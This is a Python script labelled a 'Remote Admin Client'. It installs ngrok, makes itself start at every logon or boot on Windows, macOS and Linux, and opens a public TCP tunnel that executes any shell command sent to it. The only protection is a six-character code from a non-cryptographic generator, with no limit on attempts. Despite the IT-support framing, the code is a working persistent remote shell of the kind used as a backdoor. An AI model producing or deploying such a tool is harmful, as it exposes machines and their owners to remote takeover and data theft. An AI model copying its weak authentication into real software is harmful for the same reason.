"""
client.py - Remote Admin Client

Features:
  - Auto-installs ngrok if missing
  - Prompts for ngrok auth token once, saves it forever
  - On first run: registers itself to launch on system startup
    (Windows: Task Scheduler | macOS: LaunchAgent | Linux: systemd / crontab)
  - Runs silently in the background on every boot thereafter
  - Displays ngrok address + one-time auth code for the IT admin
"""

import socket
import subprocess
import random
import string
import threading
import os
import sys
import platform
import json
import time
import shutil
import urllib.request
import zipfile
import tarfile
import stat
import tempfile

PORT       = 9999
NGROK_API  = "http://localhost:4040/api/tunnels"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
SCRIPT     = os.path.abspath(__file__)
PYTHON     = sys.executable
SYSTEM     = platform.system()
NGROK_BIN  = os.path.join(SCRIPT_DIR, "ngrok.exe" if SYSTEM == "Windows" else "ngrok")
FLAG_FILE  = os.path.join(SCRIPT_DIR, ".startup_registered")


# ══════════════════════════════════════════════════════════════
#  NGROK — download, install, authenticate
# ══════════════════════════════════════════════════════════════

def get_ngrok_download_url() -> str:
    machine = platform.machine().lower()
    if SYSTEM == "Windows":
        arch = "amd64" if ("64" in machine or "x86_64" in machine) else "386"
        return f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-{arch}.zip"
    elif SYSTEM == "Darwin":
        arch = "arm64" if "arm" in machine else "amd64"
        return f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-{arch}.zip"
    else:
        if "arm" in machine or "aarch64" in machine:
            arch = "arm64" if "64" in machine else "arm"
        else:
            arch = "amd64" if ("64" in machine or "x86_64" in machine) else "386"
        return f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-{arch}.tgz"


def ngrok_binary():
    w = shutil.which("ngrok")
    if w:
        return w
    if os.path.isfile(NGROK_BIN):
        return NGROK_BIN
    return None


def download_ngrok() -> str:
    url      = get_ngrok_download_url()
    is_zip   = url.endswith(".zip")
    suffix   = ".zip" if is_zip else ".tgz"
    bin_name = "ngrok.exe" if SYSTEM == "Windows" else "ngrok"

    print("   Downloading ngrok...")
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=suffix)
    try:
        with urllib.request.urlopen(url) as resp:
            total, done = int(resp.headers.get("Content-Length", 0)), 0
            while chunk := resp.read(65536):
                tmp.write(chunk)
                done += len(chunk)
                if total:
                    print(f"\r   Progress: {done*100//total}%  ", end="", flush=True)
        print()
        tmp.flush(); tmp.close()

        if is_zip:
            with zipfile.ZipFile(tmp.name) as zf:
                for m in zf.namelist():
                    if os.path.basename(m) == bin_name:
                        zf.extract(m, SCRIPT_DIR)
                        extracted = os.path.join(SCRIPT_DIR, m)
                        final     = os.path.join(SCRIPT_DIR, bin_name)
                        if extracted != final:
                            shutil.move(extracted, final)
                        break
        else:
            with tarfile.open(tmp.name, "r:gz") as tf:
                for m in tf.getmembers():
                    if os.path.basename(m.name) == bin_name:
                        m.name = bin_name
                        tf.extract(m, SCRIPT_DIR)
                        break
    finally:
        os.unlink(tmp.name)

    binary = os.path.join(SCRIPT_DIR, bin_name)
    if not os.path.isfile(binary):
        raise FileNotFoundError("ngrok binary not found after extraction.")
    if SYSTEM != "Windows":
        st = os.stat(binary)
        os.chmod(binary, st.st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
    return binary


def ensure_ngrok() -> str:
    binary = ngrok_binary()
    if binary:
        return binary
    print("[!] ngrok not found — installing automatically...")
    try:
        binary = download_ngrok()
        print(f"[✓] ngrok installed.")
        return binary
    except Exception as e:
        print(f"[✗] Auto-install failed: {e}")
        print("    Download manually from https://ngrok.com/download and re-run.")
        sys.exit(1)


def ensure_authtoken(binary: str):
    result = subprocess.run([binary, "config", "check"], capture_output=True, text=True)
    if result.returncode == 0 and "authtoken" in (result.stdout + result.stderr).lower():
        return  # already set

    print("\n[!] ngrok needs a free auth token to create tunnels.")
    print("    Get yours (30 sec sign-up) at:")
    print("    → https://dashboard.ngrok.com/get-started/your-authtoken\n")
    token = input("    Paste your auth token here: ").strip()
    if not token:
        print("[✗] No token entered. Cannot continue.")
        sys.exit(1)
    subprocess.run([binary, "config", "add-authtoken", token], check=True)
    print("[✓] Auth token saved.\n")


# ══════════════════════════════════════════════════════════════
#  STARTUP REGISTRATION
# ══════════════════════════════════════════════════════════════

def register_startup():
    """Register client.py to run automatically on system boot. Called once."""
    if SYSTEM == "Windows":
        _register_windows()
    elif SYSTEM == "Darwin":
        _register_macos()
    else:
        _register_linux()

    # Write flag file so we don't register again
    with open(FLAG_FILE, "w") as f:
        f.write("registered\n")
    print("[✓] Startup registration complete.\n")


def _register_windows():
    """Use Task Scheduler to run at logon, hidden."""
    task_name = "RemoteAdminClient"
    cmd = (
        f'schtasks /create /tn "{task_name}" /sc ONLOGON /rl HIGHEST /f '
        f'/tr "\\"{PYTHON}\\" \\"{SCRIPT}\\"" '
        f'/ru "{os.environ.get("USERNAME", "")}"'
    )
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print("[✓] Registered with Windows Task Scheduler (runs on every logon).")
    else:
        # Fallback: registry run key
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "RemoteAdminClient", 0, winreg.REG_SZ,
                              f'"{PYTHON}" "{SCRIPT}"')
            winreg.CloseKey(key)
            print("[✓] Registered in Windows registry Run key (runs on every logon).")
        except Exception as e:
            print(f"[!] Could not register startup automatically: {e}")
            print(f"    Add this to your startup manually:")
            print(f'    "{PYTHON}" "{SCRIPT}"')


def _register_macos():
    """Create a LaunchAgent plist so macOS starts it on login."""
    label   = "com.remotadmin.client"
    plist   = os.path.expanduser(f"~/Library/LaunchAgents/{label}.plist")
    os.makedirs(os.path.dirname(plist), exist_ok=True)
    content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{PYTHON}</string>
        <string>{SCRIPT}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>{SCRIPT_DIR}/client.log</string>
    <key>StandardErrorPath</key>
    <string>{SCRIPT_DIR}/client.log</string>
</dict>
</plist>
"""
    with open(plist, "w") as f:
        f.write(content)
    subprocess.run(["launchctl", "load", plist], capture_output=True)
    print(f"[✓] Registered as macOS LaunchAgent (runs on every login).")
    print(f"    Plist: {plist}")


def _register_linux():
    """Try systemd user service first, fall back to @reboot crontab."""
    # Try systemd
    systemd_dir = os.path.expanduser("~/.config/systemd/user")
    service_file = os.path.join(systemd_dir, "remote-admin-client.service")
    try:
        os.makedirs(systemd_dir, exist_ok=True)
        content = f"""[Unit]
Description=Remote Admin Client
After=network.target

[Service]
ExecStart={PYTHON} {SCRIPT}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
        with open(service_file, "w") as f:
            f.write(content)
        subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
        subprocess.run(["systemctl", "--user", "enable", "remote-admin-client"], capture_output=True)
        subprocess.run(["systemctl", "--user", "start",  "remote-admin-client"], capture_output=True)
        # Also enable lingering so it starts before login
        subprocess.run(
            ["loginctl", "enable-linger", os.environ.get("USER", "")],
            capture_output=True
        )
        print("[✓] Registered as systemd user service (starts on boot).")
        return
    except Exception:
        pass

    # Fallback: crontab @reboot
    try:
        existing = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
        entry    = f"@reboot {PYTHON} {SCRIPT}\n"
        if entry not in existing:
            new_cron = existing + entry
            proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
            proc.communicate(new_cron.encode())
        print("[✓] Registered in crontab @reboot (starts on every reboot).")
    except Exception as e:
        print(f"[!] Could not register startup automatically: {e}")
        print(f"    Add this to your crontab manually:")
        print(f"    @reboot {PYTHON} {SCRIPT}")


# ══════════════════════════════════════════════════════════════
#  TUNNEL
# ══════════════════════════════════════════════════════════════

def start_ngrok(binary: str) -> subprocess.Popen:
    return subprocess.Popen(
        [binary, "tcp", str(PORT)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE
    )


def get_ngrok_address(retries=15, delay=1.0):
    for _ in range(retries):
        try:
            with urllib.request.urlopen(NGROK_API, timeout=3) as resp:
                data = json.loads(resp.read())
                for tunnel in data.get("tunnels", []):
                    url = tunnel.get("public_url", "")
                    if url.startswith("tcp://"):
                        host, port = url.replace("tcp://", "").rsplit(":", 1)
                        return host, int(port)
        except Exception:
            pass
        time.sleep(delay)
    return None


# ══════════════════════════════════════════════════════════════
#  SERVER — handle incoming admin connections
# ══════════════════════════════════════════════════════════════

def generate_code(length=6):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))


def get_system_info():
    return {
        "os":         SYSTEM,
        "os_version": platform.version(),
        "hostname":   platform.node(),
        "machine":    platform.machine(),
        "cwd":        os.getcwd(),
    }


def handle_command(command: str) -> str:
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=30
        )
        output = result.stdout
        if result.stderr:
            output += "\n[STDERR]\n" + result.stderr
        return output if output else "(no output)"
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 30 seconds."
    except Exception as e:
        return f"[ERROR] {e}"


def handle_client(conn, addr, code):
    print(f"[*] Connection attempt from {addr[0]}:{addr[1]}")
    try:
        conn.sendall(b"ENTER_CODE\n")
        received = conn.recv(1024).decode().strip()

        if received != code:
            conn.sendall(b"AUTH_FAILED\n")
            print(f"[!] Failed auth from {addr[0]} — wrong code")
            return

        conn.sendall(b"AUTH_OK\n")
        print(f"[+] Admin authenticated from {addr[0]}")

        conn.sendall(f"SYSINFO {json.dumps(get_system_info())}\n".encode())

        while True:
            data = conn.recv(4096).decode().strip()
            if not data or data.lower() in ("exit", "quit", "disconnect"):
                print("[*] Admin disconnected.")
                break

            print(f"[>] Running: {data}")
            output  = handle_command(data)
            encoded = output.encode()
            conn.sendall(f"BEGIN {len(encoded)}\n".encode())
            conn.sendall(encoded)
            conn.sendall(b"\nEND\n")

    except (ConnectionResetError, BrokenPipeError):
        print("[*] Connection lost.")
    finally:
        conn.close()


# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def main():
    print("=" * 55)
    print("   Remote Admin Client")
    print("=" * 55)
    print()

    # 1. ngrok
    binary = ensure_ngrok()
    ensure_authtoken(binary)

    # 2. Register startup on first run
    if not os.path.exists(FLAG_FILE):
        print("[*] First run detected — registering startup entry...")
        register_startup()

    # 3. Start tunnel
    print(f"[*] Starting ngrok tunnel on port {PORT}...")
    ngrok_proc = start_ngrok(binary)
    tunnel     = get_ngrok_address()

    if not tunnel:
        ngrok_proc.terminate()
        err = ngrok_proc.stderr.read().decode()
        print("\n[✗] Failed to open ngrok tunnel.")
        if err:
            print(f"    ngrok: {err.strip()}")
        sys.exit(1)

    ngrok_host, ngrok_port = tunnel
    code = generate_code()

    print()
    print("=" * 55)
    print("  ✅  READY — Share these with your IT admin:")
    print("=" * 55)
    print(f"   Address  : {ngrok_host}")
    print(f"   Port     : {ngrok_port}")
    print(f"   Auth Code: {code}")
    print("=" * 55)
    print("   (This machine will appear online after every reboot)")
    print("   Waiting for connection...\n")

    # 4. Accept connections
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', PORT))
            s.listen(5)
            while True:
                conn, addr = s.accept()
                threading.Thread(
                    target=handle_client, args=(conn, addr, code), daemon=True
                ).start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    finally:
        ngrok_proc.terminate()
        print("[*] ngrok tunnel closed. Goodbye.")


if __name__ == "__main__":
    main()
